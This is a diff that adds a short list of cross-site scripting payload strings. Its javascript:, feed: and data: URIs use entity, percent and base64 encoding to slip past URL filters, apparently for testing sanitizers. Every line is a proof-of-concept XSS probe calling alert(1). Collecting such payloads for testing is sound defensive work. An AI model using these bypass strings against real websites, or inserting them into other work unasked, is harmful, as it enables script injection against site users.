@@ -1,0 +1,14 @@
+javascript:alert(1)
+ javascript:alert(1)
+javascript&colon;alert(1)
+javascript&#x3A;alert(1)
+j&#x61;v&#x41;sc&#x52;ipt&#x3A;alert(1)
+j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;
+feed:javascript:alert(1)
+feed:javascript&colon;alert(1)
+feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e
+feed:data:text/html,%3csvg%20onload=alert%281%29%3e
+data:text/html,%3Cscript%3Ealert(1)%3C/script%3E
+d&#x61;t&#x61;&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:_;;;:;base64_______,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
